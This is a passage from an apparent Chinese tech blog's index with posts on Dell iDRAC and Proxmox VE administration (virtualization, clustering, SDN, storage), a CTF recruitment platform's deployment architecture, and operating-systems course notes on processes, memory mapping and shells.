点击「Launch Virtual Console」，下载并运行 Java 插件或 HTML5 客户端（现代 iDRAC 支持无插件 HTML5 模式）； 客户端启动后，即可看到服务器的实时控制台画面，通过本地键盘鼠标远程操作（支持快捷键，如Ctrl+Alt+Del）。 虚拟介质挂载 ISO 步骤 在 iDRAC Web 界面的「Console/Media」页面，切换到「Virtual Media」标签； 点击「Attach」，选择本地电脑中的 ISO 文件（或输入网络共享路径）； 勾选「Auto-attach on next connection」，确保服务器能识别虚拟介质； 进入 KVM 控制台，重启服务器并按对应快捷键（如 F11）进入启动菜单，选择虚拟光驱作为启动项，即可从 ISO 启动。 命令行管理 除 Web 界面外，可通过ipmitool工具（基于 IPMI 协议）命令行操作，适合自动化脚本：\n1 2 3 4 5 6 7 8 # 安装ipmitool（Linux） sudo apt install ipmitool # Debian/Ubuntu sudo yum install ipmitool # CentOS/RHEL # 远程连接iDRAC（需开启IPMI Over LAN） ipmitool -H 192.168.0.120 -U root -P password power status # 查看电源状态 ipmitool -H 192.168.0.120 -U root -P password power reset # 远程重启 ipmitool -H 192.168.0.120 -U root -P password sensor list # 查看传感器状态（温度、风扇等） PVE虚拟化 Proxmox VE（简称 PVE）是一款基于 Debian 的开源虚拟化管理平台，整合了 KVM 全虚拟化、LXC 容器技术及集群管理功能\nKVM（全虚拟化）与 LXC（容器）的优劣及选型 PVE 同时支持 KVM 和 LXC 两种虚拟化方案，二者底层技术原理不同，适用场景各有侧重。\nKVM（全虚拟化）与 LXC（容器）的优劣及选型 KVM（全虚拟化）\n本质：基于 Linux 内核的虚拟化模块，通过硬件辅助虚拟化技术（如 Intel VT-x、AMD-V），为虚拟机（VM）模拟完整的硬件环境（CPU、内存、硬盘、网卡等），虚拟机中可安装任意操作系统（如 Windows、Linux、FreeBSD）。 隔离性：虚拟机与宿主机、虚拟机之间完全隔离，拥有独立的内核空间，一个 VM 故障不会影响其他 VM 或宿主机。 LXC（容器虚拟化）\n本质：基于 Linux 内核的容器技术，通过 namespace（命名空间）实现资源隔离，通过 cgroup（控制组）实现资源限制，容器共享宿主机的 Linux 内核，仅封装应用及依赖环境。 轻量性：无需模拟硬件和运行独立内核，启动速度快、资源占用低，可在单台宿主机上部署大量容器。 优劣对比 维度 KVM（全虚拟化） LXC（容器） 资源占用 高（需分配独立硬件资源，存在虚拟化开销） 低（共享内核，几乎无虚拟化开销） 启动速度 慢（需加载完整操作系统，通常分钟级） 快（直接启动应用，秒级甚至毫秒级） 隔离性 强（独立内核，硬件级隔离） 弱（共享内核，依赖内核 namespace 隔离，存在逃逸风险） 系统兼容性 高（支持任意操作系统） 低（仅支持与宿主机内核兼容的 Linux 发行版） 管理复杂度 高（需配置完整硬件参数、网络、存储） 低（简化的资源配置，依赖宿主机基础设施） 硬件穿透 支持（可直接映射 GPU、USB 设备等） 有限（需宿主机内核支持，部分设备无法直接穿透） 优先选 KVM 的场景\n需运行 Windows 等非 Linux 操作系统； 对隔离性和安全性要求高（如运行多租户应用、核心业务系统）； 需要硬件设备穿透（如 GPU 虚拟化用于 AI 计算、USB 加密狗）； 应用对内核版本敏感，需独立内核环境。 优先选 LXC 的场景\n运行 Linux 轻量应用（如 Web 服务、API 接口、脚本程序）； 追求高密度部署（如单台服务器部署数十个应用实例）； 对启动速度和资源利用率要求高（如微服务架构、临时测试环境）； 简化运维，降低管理成本。 快照（Snapshot）与备份（Backup）的区别 快照 快照是对虚拟机 / 容器在某一时刻的系统状态（包括内存数据、磁盘数据、配置信息）的瞬时记录。基于写时复制（Copy-on-Write, CoW）技术实现:\n快照创建后，原始数据被冻结，后续修改操作会写入新的存储块； 回滚时，丢弃修改的存储块，恢复到快照创建时的原始状态，过程快速（秒级） 优势：创建和回滚速度快，不占用大量即时存储（仅记录修改数据），适合临时测试、软件升级等场景的快速故障恢复。\n局限：\n依赖原始存储，若原始存储损坏，快照也会失效； 长期保留快照会导致存储性能下降（需跟踪大量修改块）； 部分存储类型（如 RAW 格式磁盘）不支持内存快照，仅能记录磁盘数据。 适用场景\n软件升级、补丁安装前创建快照，若升级失败可快速回滚；\n临时测试新应用，测试完成后通过快照恢复环境；\n短期故障恢复（如误操作导致的配置错误）。\n备份 备份是将虚拟机 / 容器的完整数据（磁盘镜像、配置文件）复制到本地其他存储或异地存储的过程，支持全量备份和增量备份：\n全量备份：复制全部数据，占用空间大但恢复速度快； 增量备份：仅复制上次备份后修改的数据，占用空间小但恢复时需依赖全量备份和后续增量备份链。 优势：数据独立于原始存储，支持异地存储，可应对原始存储损坏、机房灾难等严重故障，是容灾的核心手段。\n局限：创建和恢复速度慢（需传输大量数据），占用额外存储资源，增量备份恢复时依赖备份链完整性。\n适用场景:\n长期数据归档（如按天 / 周 / 月定期备份）；\n异地容灾（将备份数据存储到不同机房或云存储）；\n严重故障恢复（如硬盘损坏、病毒攻击导致的数据丢失）。\n集群：基于 Corosync 与共享存储的高可用架构 PVE 集群的核心目标是实现虚拟资源的高可用（HA），避免单点故障导致业务中断，其运行依赖 Corosync 集群通信协议、共享存储及 “法定人数” 机制。\n核心组件 Corosync：集群通信与故障检测\n作用：作为集群的 “神经中枢”，负责节点间的心跳检测、状态同步和资源调度指令传输。 工作机制：通过多播或单播方式在集群节点间发送心跳包（默认每 2 秒一次），若某节点超时未响应，Corosync 判定其故障，触发资源迁移。 可靠性保障：支持冗余通信链路，避免因单条网络故障导致的节点误判。 共享存储：资源统一调度的基础\n作用：集群中所有节点需访问统一的共享存储（如 Ceph、GlusterFS、iSCSI、NFS），确保虚拟机 / 容器的磁盘数据在节点间可共享。 必要性：当故障节点上的虚拟资源迁移到正常节点时，新节点需从共享存储中读取数据，避免数据不一致。 常见方案：中小企业常用 iSCSI 或 NFS（部署简单），大规模集群优先选 Ceph（分布式存储，高可用且可扩展）。 法定人数（Quorum）：防止脑裂的关键机制 脑裂问题的成因:\n当集群网络分区（如交换机故障导致节点分为两组），每组节点都认为对方故障，若两组都继续运行虚拟资源，会导致数据写入冲突（如同一虚拟机在两组节点同时运行），即 “脑裂”。 法定人数机制原理:\n法定人数定义：集群正常运行所需的最小节点数量，计算公式为 Quorum = (总节点数 / 2) + 1（向上取整）。\n工作逻辑：当集群网络分区后，仅节点数量达到或超过法定人数的分区可继续提供服务，另一分区会自动停止所有虚拟资源，避免脑裂。\n针对偶数节点集群（如 4 节点），可添加 QDevice（独立的轻量节点，不运行业务资源），其作用是在网络分区时提供 “额外投票权”，避免集群因双方节点数相等而暂停服务。\n适用场景与局限 适用场景：运行核心业务（如数据库、ERP 系统），对业务连续性要求高，需避免单点故障。 局限：部署复杂度高（需配置共享存储、集群网络），硬件成本增加，小规模非关键业务集群性价比低。 存储 LVM-Thin 是 PVE 中常用的精简置备存储方案，通过动态分配存储资源提升利用率，但需警惕 “超售” 带来的风险。\nLVM-Thin 核心原理 精简配置（Thin Provisioning）\n与传统 LVM（厚置备）不同，LVM-Thin 创建虚拟磁盘时，仅分配 “逻辑容量”，而非立即占用实际物理存储，只有当虚拟机 / 容器写入数据时，才会动态占用物理空间。\n示例：创建 2 个各 100GB 的 LVM-Thin 虚拟磁盘，若实际仅写入 20GB 数据，总占用物理空间为 20GB，而非 200GB。 关键组件\nThin Pool：精简存储池，是 LVM-Thin 的核心，所有虚拟磁盘的动态空间均从池中分配。 元数据（Metadata）：记录 Thin Pool 中空间的分配状态，确保数据写入时不冲突。 优势\n提升存储利用率：避免传统厚置备中 “分配未使用” 的空间浪费，适合存储需求波动大的场景（如测试环境、弹性业务）。 简化容量规划：无需提前精确预估每个虚拟资源的存储需求，可按需动态扩展（只要 Thin Pool 有剩余空间）。 支持快照功能：LVM-Thin 原生支持快照，且快照创建速度快、占用空间小，与 PVE 的快照功能完美兼容。 “超售” 风险与应对措施 超售风险的成因\n由于 LVM-Thin 允许逻辑容量总和超过物理存储容量（即 “超售”），若多个虚拟资源同时写入大量数据，会导致 Thin Pool 空间耗尽，进而引发虚拟机卡死、数据写入失败甚至数据损坏。\n风险应对措施\n合理规划超售比例：根据业务实际写入量控制超售比例（建议不超过 2:1），避免过度超售。 启用空间监控与告警：在 PVE 中设置 Thin Pool 空间阈值告警（如剩余空间低于 20% 时触发告警），及时扩容或清理无用数据。 定期清理快照：长期保留的快照会占用 Thin Pool 空间，需定期删除无用快照。 避免存储密集型应用：不建议在 LVM-Thin 上运行数据库、日志存储等高频写入的存储密集型应用，优先使用厚置备或分布式存储。 ","date":"2025-11-09T00:00:00Z","permalink":"https://calendar0917.github.io/posts/devops-%E7%A1%AC%E4%BB%B6%E8%99%9A%E6%8B%9F%E5%8C%96%E4%B8%8Epve/","title":"服务器硬件、虚拟化与PVE"},{"content":"知识补充 PVE SDN 的核心概念 LXC使用tailscale注意事项\n非特权 LXC 容器的 root 用户（uid 0）会映射到宿主机的普通用户，安全性更高，但默认没有 Tailscale 所需的网络资源权限。 Tailscale 通过 UDP 数据包封装隧道，无需内核模块，但必须访问 /dev/tun 设备 —— 这是非特权容器默认不提供的。所以需要给 LXC 容器开放 /dev/tun 访问 具体操作\n根据 Proxmox 版本不同，配置方式略有差异，但核心命令一致：\n适用 Proxmox 7 及以上（cgroup2 环境）\n找到目标 LXC 容器的配置文件：路径为 /etc/pve/lxc/[容器ID].conf（比如容器 ID 是 112，文件就是 112.conf）。\n在配置文件中添加以下 2 行：\n1 2 lxc.cgroup2.devices.allow: c 10:200 rwm lxc.mount.entry: /dev/net/tun dev/net/tun none bind,create=file 重启容器：已运行的容器需先关机再启动，配置才会生效。\n后续操作：容器内安装 Tailscale Linux 包，即可正常使用。\n适用 Proxmox 6 及更早（cgroup 环境）\n配置命令与 Proxmox 7 类似，仅需将 cgroup2 改为 cgroup：\n1 2 lxc.cgroup.devices.allow: c 10:200 rwm lxc.mount.entry: /dev/net/tun dev/net/tun none bind,create=file 其余步骤（重启容器、安装 Tailscale）一致。\nProxmox VE 的 SDN 功能通过 “Zone（区域）- VNet（虚拟网络）- Subnet（子网）” 三层模型实现网络虚拟化，核心目标是为虚拟机 / 容器提供隔离的网络环境，同时支持灵活的地址管理、DHCP 服务和地址转换（SNAT）。\nZone：最高级别的隔离单元，定义网络的基础类型（此处均为simple类型，即简单隔离模式，适用于单机或小规模集群）。 VNet：绑定到 Zone 的虚拟网络，作为子网的载体，实现不同网络的逻辑隔离。 Subnet：VNet 下的 IP 地址段，包含网关、DHCP 地址池、SNAT 开关等配置，直接为虚拟机分配网络资源。 子网 子网就像一个 “小区”，里面有很多 “房子”（IP 地址）。每个子网都有一个固定的 “地址范围”，比如配置中的 10.22.0.0/24 或 10.33.0.0/16，这串数字定义了这个 “小区” 里有多少个可用的 IP 地址。\n例子：10.22.0.0/24 表示这个子网的 IP 地址从 10.22.0.1 到 10.22.0.254（共 254 个地址），适合设备数量较少的场景。 例子：10.33.0.0/16 表示从 10.33.0.1 到 10.33.255.254（共 65534 个地址），适合设备数量多的场景。 常用的 IP 地址是 32 位二进制数,0/16 表示前十六位，即10.33不变 为什么需要子网？\n如果所有设备都用同一个大网段，就像一个超级大的小区，找设备、管理设备会很麻烦，还容易冲突。子网通过 “分区” 让网络更有序，比如 R730 的 vnet1 和 vnet2 分别用两个子网，避免了 IP 地址混乱。\n网关 网关是子网的 “大门”，是一个特殊的 IP 地址（比如 10.22.0.1），负责子网内的设备和外部网络（其他子网或互联网）之间的通信。\n比如：vnet1 子网的设备（IP 可能是 10.22.0.100）要访问 vnet2 子网的设备（IP 可能是 10.33.1.100），必须通过各自的网关（10.22.0.1 和 10.33.0.1）转发数据。 如果设备要访问互联网，也必须通过网关 “出门”。 网关的作用：\n没有网关，子网就是一个 “孤岛”，里面的设备只能互相通信，无法连接外部。配置中的每个子网都指定了网关（如 G: 10.22.0.1），就是为了让子网能和外界互通。\nDCHP DHCP（动态主机配置协议）就像一个 “门牌号管理员”，当子网里新增设备（比如虚拟机）时，它会自动分配一个 IP 地址（从预设的地址池里选），不用人工手动设置。\n例子：R730 的 vnet1 子网中，DHCP 地址池是 10.22.0.100 - 10.22.0.200，表示新设备接入时，会自动拿到这个范围内的 IP（比如 10.22.0.101、10.22.0.150 等）。 好处：避免人工分配 IP 时的冲突（比如两个人同时用 10.22.0.10），减少管理成本。 SNAT SNAT（源网络地址转换）可以理解为子网的 “共用身份证”。子网内的设备没有直接连接互联网的 “公网 IP”，当它们要访问互联网时，网关会把设备的 “私网 IP”（如 10.22.0.100）转换成网关自己的 “公网 IP”，相当于用网关的身份去访问外部，回来的数据再转回去。\n例子：vnet1 启用 SNAT 后，子网内的虚拟机（IP 10.22.0.100）访问百度时，百度看到的不是 10.22.0.100，而是服务器 R730 的公网 IP（比如 192.168.31.45 对应的公网地址）。 好处：不需要给每个设备分配公网 IP（公网 IP 有限且贵），通过网关 “共用” 一个公网 IP 即可访问外部。 为什么配置中都启用 SNAT？\n因为这些子网用的是 “私网 IP”（10.x.x.x 是内网专用地址，不能直接访问互联网），必须通过 SNAT 转换才能和互联网通信，所以 R730 和 R510 的所有子网都开启了 SNAT。\nVNet VNet（虚拟网络）是一个 “逻辑上的独立网络”，就像在物理服务器上划分出的 “虚拟网线”，不同 VNet 之间默认是隔离的（不能直接通信），即使它们在同一个物理服务器上。\n作用：隔离不同的服务（比如 “新服务” 用 vnet1，“测试服务” 用 vnet2），提高安全性，避免互相干扰。\nZone Zone 是 VNet 的 “容器”，可以包含多个 VNet，定义了这些 VNet 的基础网络规则（比如用什么技术隔离、用什么工具分配 IP 等）。配置中的 Zone 类型都是 simple（简单模式），适合单机或小规模场景。\nPVE SDN布局 R730 Zone: zone111 (simple) VNet 1: vnet1 ‑\u0026gt; zone111 Subnet: 10.22.0.0/24 (G: 10.22.0.1) SNAT: 启用 DHCP: 10.22.0.100 ‑ 10.22.0.200 VNet 2: vnet2 ‑\u0026gt; zone111 Subnet: 10.33.0.0/16 (G: 10.33.0.1) SNAT: 启用 DHCP: 10.33.1.100 ‑ 10.33.1.200 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 # /etc/pve/sdn/.running-config { \u0026#34;controllers\u0026#34;: { \u0026#34;ids\u0026#34;: {} }, \u0026#34;zones\u0026#34;: { \u0026#34;ids\u0026#34;: { \u0026#34;zone111\u0026#34;: { \u0026#34;dhcp\u0026#34;: \u0026#34;dnsmasq\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;simple\u0026#34;, \u0026#34;ipam\u0026#34;: \u0026#34;pve\u0026#34; } } }, \u0026#34;subnets\u0026#34;: { \u0026#34;ids\u0026#34;: { \u0026#34;zone111-10.33.0.0-16\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;subnet\u0026#34;, \u0026#34;vnet\u0026#34;: \u0026#34;vnet2\u0026#34;, \u0026#34;dhcp-range\u0026#34;: [\u0026#34;start-address=10.33.1.100,end-address=10.33.1.200\u0026#34;], \u0026#34;gateway\u0026#34;: \u0026#34;10.33.0.1\u0026#34;, \u0026#34;snat\u0026#34;: 1 }, \u0026#34;zone111-10.22.0.0-24\u0026#34;: { \u0026#34;dhcp-range\u0026#34;: [\u0026#34;start-address=10.22.0.100,end-address=10.22.0.200\u0026#34;], \u0026#34;gateway\u0026#34;: \u0026#34;10.22.0.1\u0026#34;, \u0026#34;vnet\u0026#34;: \u0026#34;vnet1\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;subnet\u0026#34;, \u0026#34;snat\u0026#34;: 1 } } }, \u0026#34;version\u0026#34;: 7, \u0026#34;vnets\u0026#34;: { \u0026#34;ids\u0026#34;: { \u0026#34;vnet2\u0026#34;: { \u0026#34;zone\u0026#34;: \u0026#34;zone111\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;vnet\u0026#34; }, \u0026#34;vnet1\u0026#34;: { \u0026#34;zone\u0026#34;: \u0026#34;zone111\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;vnet\u0026#34; } } } } R510 Zone 1: recuit24 (simple)\nVNet: recuit24 → 10.222.0.0/16（网关：10.222.0.1），SNAT: 启用 DHCP地址池：10.222.0.1 ~ 10.222.0.124 Zone 2: SIMP (simple)\nVNet: VNSimp24 → 10.10.77.0/24（网关：10.10.77.1），SNAT: 启用 DHCP地址池：10.10.77.100 ~ 10.10.77.200、10.10.77.202 ~ 10.10.77.234 Zone 3: SimpNew (simple)\nVNet: SIMPSIMP → 10.10.33.0/24（网关：10.10.33.1），SNAT: 启用 DHCP地址池：10.10.33.100 ~ 10.10.33.200 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 # /etc/pve/sdn/.running-config { \u0026#34;vnets\u0026#34;: { \u0026#34;ids\u0026#34;: { \u0026#34;SIMPSIMP\u0026#34;: { \u0026#34;zone\u0026#34;: \u0026#34;SimpNew\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;vnet\u0026#34; }, \u0026#34;recuit24\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;vnet\u0026#34;, \u0026#34;zone\u0026#34;: \u0026#34;recuit24\u0026#34; }, \u0026#34;VNSimp24\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;vnet\u0026#34;, \u0026#34;zone\u0026#34;: \u0026#34;SIMP\u0026#34; } } }, \u0026#34;subnets\u0026#34;: { \u0026#34;ids\u0026#34;: { \u0026#34;SIMP-10.10.77.0-24\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;subnet\u0026#34;, \u0026#34;dhcp-range\u0026#34;: [ \u0026#34;start-address=10.10.77.100,end-address=10.10.77.200\u0026#34;, \u0026#34;start-address=10.10.77.202,end-address=10.10.77.234\u0026#34; ], \u0026#34;gateway\u0026#34;: \u0026#34;10.10.77.1\u0026#34;, \u0026#34;vnet\u0026#34;: \u0026#34;VNSimp24\u0026#34;, \u0026#34;snat\u0026#34;: 1 }, \u0026#34;SimpNew-10.10.33.0-24\u0026#34;: { \u0026#34;vnet\u0026#34;: \u0026#34;SIMPSIMP\u0026#34;, \u0026#34;gateway\u0026#34;: \u0026#34;10.10.33.1\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;subnet\u0026#34;, \u0026#34;dhcp-range\u0026#34;: [ \u0026#34;start-address=10.10.33.100,end-address=10.10.33.200\u0026#34; ], \u0026#34;snat\u0026#34;: 1 }, \u0026#34;recuit24-10.222.0.0-16\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;subnet\u0026#34;, \u0026#34;dhcp-range\u0026#34;: [ \u0026#34;start-address=10.222.0.1,end-address=10.222.0.124\u0026#34; ], \u0026#34;vnet\u0026#34;: \u0026#34;recuit24\u0026#34;, \u0026#34;gateway\u0026#34;: \u0026#34;10.222.0.1\u0026#34;, \u0026#34;snat\u0026#34;: 1 } } }, \u0026#34;controllers\u0026#34;: { \u0026#34;ids\u0026#34;: {} }, \u0026#34;version\u0026#34;: 24, \u0026#34;zones\u0026#34;: { \u0026#34;ids\u0026#34;: { \u0026#34;SIMP\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;simple\u0026#34;, \u0026#34;dhcp\u0026#34;: \u0026#34;dnsmasq\u0026#34;, \u0026#34;ipam\u0026#34;: \u0026#34;pve\u0026#34; }, \u0026#34;recuit24\u0026#34;: { \u0026#34;ipam\u0026#34;: \u0026#34;pve\u0026#34;, \u0026#34;dhcp\u0026#34;: \u0026#34;dnsmasq\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;simple\u0026#34; }, \u0026#34;SimpNew\u0026#34;: { \u0026#34;ipam\u0026#34;: \u0026#34;pve\u0026#34;, \u0026#34;dhcp\u0026#34;: \u0026#34;dnsmasq\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;simple\u0026#34; } } } } 24 年的招新平台架构 核心架构（PVE角色映射） 架构分层 PVE角色 核心功能 网络配置 公网入口 公网VM（有公网IP） 流量转发+反向代理打通内网访问 公网IP，开放80端口 核心调度 内网核心VM（内网IP） 流量分发+容器管理+数据库存储 内网IP（如192.168.1.100） 动态题目运行 Docker VM（内网IP） 运行Docker容器+接收容器管理指令 内网IP（如192.168.1.101） 静态题目运行 静态题目VM/LXC 运行静态题目服务（Web/PWN等） 内网IP（如192.168.1.103） 部署步骤 公网VM 安装：nginx + autossh nginx配置：监听80端口，转发所有请求到本地9000端口（传递Host/用户IP） autossh配置：autossh -M 23333 -NR 9000:192.168.1.100:9000 root@内网核心VMIP（反向代理到内网核心VM:9000） 关键：免密SSH登录内网核心VM，设置autossh开机自启 内网核心VM（核心部署） 依赖：Python3 + requests + flask + sqlite3 部署文件：listener.py（9000端口）、docker-manager.py（9001端口）、db.py、ctf.db（初始化3表：prob/docker/container） 配置要点： listener.py：监听0.0.0.0:9000，正则匹配子域名（静态3位数字/动态随机字符） docker-manager.py：监听0.0.0.0:9001，关联数据库+调用Docker VM接口 启动：创建systemd服务，设置开机自启（确保9000/9001端口监听） Docker VM 安装：Docker引擎 + docker-listener.py（9000端口） 配置：docker-listener.py监听0.0.0.0:9000，接收容器启停指令 测试：docker run hello-world验证Docker可用性，设置服务开机自启 静态题目VM/LXC 部署：运行静态题目服务（如Web开80端口、PWN开9999端口） 配置：内网核心VM的ctf.db中插入题目记录（id+IP+端口） 核心流量链路 用户请求→公网VM:80→nginx转发到本地9000端口 autossh反向代理→内网核心VM:9000（静态）/9001（容器管理） 静态题目：listener.py查询prob表→转发到静态题目VM端口 动态题目：docker-manager.py调用Docker VM:9000→启动容器→listener.py查询container表→转发到容器映射端口 关键配置/验证要点 网络：所有内网VM在同一网段，开放必要端口（9000/9001/容器端口） 自启：所有服务（nginx/autossh/listener/docker-manager/docker-listener）均设置systemd开机自启 数据库：ctf.db需初始化3表，静态题目/动态模板需手动插入记录 排查：用systemctl status 服务名查状态，netstat -tulpn查端口监听，确保免密SSH/容器端口可访问 ","date":"2025-11-09T00:00:00Z","permalink":"https://calendar0917.github.io/posts/devops-%E5%BE%A1%E6%9E%97%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%88%9D%E6%AD%A5%E8%AE%A4%E8%AF%86/","title":"御林服务器的初步认识"},{"content":"操作系统概述 1940s 的计算机（ENIAC）：\n逻辑门：真空电子管 延迟线内存通过 “抛球” 来扩大存储空间 没有操作系统！只需要执行程序即可 1950s：\n磁芯内存 可以执行更复杂的任务，希望调用 API 而不是直接访问设备 在只有一个 CPU 的情况下，需要管理多个程序执行 1960s：\n内存更大，意味着可以放多个程序到内存里 需要操作系统介入，实现多程序同时运行 还需要硬件变化，在多个地址隔离的程序间切换 1970s+：\n基本现代化 程序和编译器 状态机：数字逻辑电路的模拟器\n寄存器存储 + 运行逻辑 + 按照时间周期运行 \u0026ndash;\u0026gt; 状态转换\n程序就是状态机！\n程序的状态有什么？\n变量？全局 or 局部？ 函数调用、函数返回是什么？ \u0026ndash;\u0026gt; 栈帧的处理，调用是PUSH，返回是 POP 程序 = 计算 + syscall\n加上了系统调用，将操作权交给系统。 编译器\n优化可优化的部分，转义不可优化的部分 状态机的初始状态（lib-64-linux/\u0026hellip;）等等都有定义，都建立在确定的基础上。\ngdb、strace、binutils 追踪\n并发 多处理器编程 原子性 并发的基础：多线程\n线程共享内存、具有独立堆栈 如何验证？ \u0026ndash;\u0026gt; strace…… 带来的问题：\n多线程共用变量时，发生冲突 基本假设不再成立：程序不再独占处理器执行 解决：实现原子性\n将大人物切分为可以并行的小任务 用 worker thread 去锁保护的队列里取任务 顺序 编译器默认程序时顺序执行的，以进行优化；但是多线程时顺序不一定成立\n可见性 处理器同时也是编译器，能够同时执行一个线程的指令\n即便是汇编，也可能产生步骤乱序执行 需要放弃对旧的“程序”的理解\n理解并发程序执行 Peterson 算法 举旗，两个共享变量实现并发？\n用贴对方的标签来竞争 如何证明正确性？\n画状态机？枚举所有可能性 PC 的含义 \u0026ndash;\u0026gt; 指令的步骤++ 用 python 来检测！选对语言 py 的特性，yield\n只要能位系统建立模型，就能证明正确 / 找到错误\n将问题转化为图论问题\n在多处理器上实现线程隔离 虚拟化 把物理计算机 “抽象” 成 “虚拟计算机” 程序好像独占计算机运行 程序和进程 程序是状态机的静态描述 描述了所有可能的程序状态 程序 (动态) 运行起来，就成了进程 (进行中的程序) 可以使用文件 API (“everything is a file”) 访问当前进程的 ID、状态信息、命令行参数和工作目录等元数据。 进程（状态机）管理 操作系统 = 状态机的管理者\n创建状态机：spawn(path, argv)\n销毁状态机: _exit()\n复制状态机: fork()\n完整复制状态机；新创建的状态机返回值为 0，执行 fork() 的进程会返回子进程的进程号。 pritf 的输出机制，输出到缓冲区 复位状态机: execve()\n参数 path、argv、evnp windows 与 Unix 管理进程的 API 不同\n进程的地址空间 进程的初始状态\n寄存器\nABI 中规定了 initial state\n只规定了部分寄存器和栈 (argv 和 envp 中的字符串保存在栈中)\n内存\nBinary 中指定的 PT_LOAD 段 内存是分成 “一段一段” 的 每一段有访问权限 (rwx) 只有ELF 文件里声明的内存和一些操作系统分配的内存 任何其他指针的访问都是非法的 所以需要能够动态分配！ 进程的地址空间管理\n在状态机状态上增加/删除/修改一段可访问的内存\nMAP_ANONYMOUS: 匿名 (申请) 内存\nfd: 把文件 “搬到” 进程地址空间中 (例子：加载器)\n1 2 3 4 5 6 7 // 映射 void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset); int munmap(void *addr, size_t length); // 修改映射权限 int mprotect(void *addr, size_t length, int prot); 可以用 pmap 命令查看进程的地址空间\n瞬间完成内存分配\nmmap/munmap 为 malloc/free 提供了机制 libc 的大 malloc 会直接调用一次 mmap 实现 pmap 命令通过读取 /proc/[pid]/maps 和 /proc/[pid]/smaps 文件来获取进程的内存映射信息。Linux 内核将这些信息以文本形式暴露在 /proc 文件系统中，pmap 通过解析这些文件实现功能，而无需直接调用特定的系统调用。\n入侵地址空间\ngdb 的实现原理，可以任意观测、修改程序状态 小时候用的游戏修改器，需要多次读取数据，筛选后修改。原理就是监控游戏的整块内存。\n访问操作系统对象 先回顾一下操作系统创建的流程：一开始只有一个进程，然后通过 fork 产生出子进程，接着用 execve 来替换子进程为目标进程，再用 mmap 来分配空间\n文件描述符\n是指向操作系统对象的 “指针”——系统调用通过这个指针 (fd) 确定进程希望访问操作系统中的哪个对象。我们有 open, close, read/write, lseek, dup 管理文件描述符。\n对象的访问都需要指针 open, close, read/write (解引用), lseek (指针内赋值/运算), dup (指针间赋值) 在 fork 的时候，文件描述符继承吗？ 继承（UNIX中），方便但是危险 \u0026ldquo;文件\u0026rdquo;：有名字的数据对象，Everything is a file\n操作系统中的对象\n真实的设备 /dev/sda 虚拟的设备（文件） /dev/urandom，/dev/null，并没有实际文件，但是操作系统为它们实现了特别的read、write操作 管道：特殊的文件流 读口支持 read，写口支持 write 整合起来，就是所有的基础知识：\n进程管理\nfork, execve, waitpid, exit 内存管理\nmmap, munmap, mprotect, msync 文件管理\nopen, close, read, write, lseek, dup 一切皆文件的利弊：\n一套 API 可以访问所有对象,便捷 一切都可以 | grep 但是涉及多义性、复杂项目下不便、耦合度高、高速设备不友好\u0026hellip; 终端和 UNIX shell 终端的历史，其实就是直接控制硬件（打字机、繁重而昂贵的操作系统）的输入 - 输出互动的窗口\n今天则用伪终端（Pseudo Terminal）来模拟\n用户登录的起点\n系统启动 (内核 → init → getty) 远程登录 (sshd → fork → openpty) stdin, stdout, stderr 都会指向分配的终端 vscode (fork → openpty) login 程序继承分配的终端\n(是的，login 是一个程序) fork() 会继承文件描述符 (指针) 因此，子进程也会指向同一个终端 终端的机制\n怎么确定要控制的是那个终端/进程？（比如Ctrl + C） 只管传输字符 \u0026ndash;\u0026gt; 由操作系统来决定如何对“当前”进程采取行动 历史遗留问题，局限性：无法预知软件的未来 要做的是进行抽象，不要在把高层“意图”翻译成低层“规程”上花费脑力和时间 Shell编程\n基于文本替换的极简编程语言！ 预处理: $(), \u0026lt;() 重定向: cmd \u0026gt; file \u0026lt; file 2\u0026gt; /dev/null 顺序结构: cmd1; cmd2, cmd1 \u0026amp;\u0026amp; cmd2, cmd1 || cmd2 管道:cmd1 | cmd2 这些命令被翻译成系统调用序列 (open, dup, pipe, fork, execve, waitpid, \u0026hellip;) C 标准库和实现 API 的设计有一个有趣的原则：“非必要不实现” (“机制与策略分离”、“最小完备性原则”)：但凡应用程序能自己搞定的功能，操作系统就不需要提供——在一定程度上，这样的设计能防止 “包揽一切” 导致代码膨胀，甚至在长期演化的过程中成为历史的包袱。\nC 是一种 “高级汇编语言”\n作为对比，C++ 更好用，但也更难移植 系统调用的一层 “浅封装”\nlibc\n大部分可以用 C 语言本身实现 少部分需要一些 “底层支持” 例子：体系结构相关的内联汇编 “最小完备性原则” 和 “机制策略分离” 的反面教材\n“每一个 malloc 在任何可能路径上都必有一次配对的 free，且之后不再使用” 在复杂系统里太难保证了 脱离 workload 做优化就是耍流氓\n在开始考虑性能之前，理解你需要考虑什么样的性能 可执行文件 是什么\nELF 是 Executable and Linkable Format 的缩写，是 Linux 系统上的一种可执行文件格式。\n一个操作系统中的对象 (文件) 一个字节序列 (我们可以把它当字符串编辑) 一个描述了状态机初始状态的数据结构 需要什么\n一个头 (类似 7f 45 4c 46; 这是一个 jg 71) 一段 Trampoline Code (PIC) 操作系统会给一个文件描述符 (指向文件本身) 这段代码直接执行 hardcoded mmap (就能实现 “加载” 的功能) 反思\nELF 不是一个人类友好的 “状态机数据结构描述”\n为了性能，彻底违背了可读 (“信息局部性”) 原则\nCrash (SIGSEGV, SIGABRT, SIGILL, \u0026hellip;) 时会做 core dump\nulimit -c unlimited：启用 